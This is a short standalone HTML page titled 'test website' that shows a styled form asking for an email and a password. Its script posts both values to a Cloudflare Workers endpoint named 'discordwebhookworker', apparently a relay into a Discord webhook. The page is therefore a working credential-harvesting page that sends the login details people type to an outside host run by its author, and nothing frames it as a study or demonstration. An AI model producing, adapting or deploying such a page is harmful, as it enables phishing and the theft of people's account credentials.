<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>test website</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #292828;
            font-family: Arial, sans-serif;
        }

        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }

        input {
            display: block;
            width: 300px;
            padding: 12px;
            margin: 10px auto;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 6px;
        }

        button {
            width: 300px;
            padding: 12px;
            margin-top: 10px;
            font-size: 16px;
            border: none;
            border-radius: 6px;
            background: #333;
            color: white;
            cursor: pointer;
        }

        button:hover {
            background: #555;
        }

        #status {
            margin-top: 15px;
            font-size: 14px;
        }
    </style>
</head>

<body>

    <div class="container">

        <form id="messageForm">

            <input
                type="text"
                id="first"
                placeholder="email"
                maxlength="1000"
                required
            >

            <input
                type="text"
                 id="second"
                 placeholder="password"
                 maxlength="1000"
                 required
            >

            <button type="submit">
                send
            </button>

        </form>

        <div id="status"></div>

    </div>

    <script>
        const form = document.getElementById("messageForm");
        const status = document.getElementById("status");

        form.addEventListener("submit", async (event) => {
            event.preventDefault();

            const first = document.getElementById("first").value;
            const second = document.getElementById("second").value;

            status.textContent = "sending . . .";

            try {
                const response = await fetch("https://discordwebhookworker.strautnieksmikus09.workers.dev/", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        first: first,
                        second: second
                    })
                });

                if (!response.ok) {
                    throw new Error("request failed");
                }

                status.textContent = "sent";

                form.reset();

            } catch (error) {
                console.error(error);
                status.textContent = "samzin wrongs";
            }
        });
    </script>

</body>
</html>
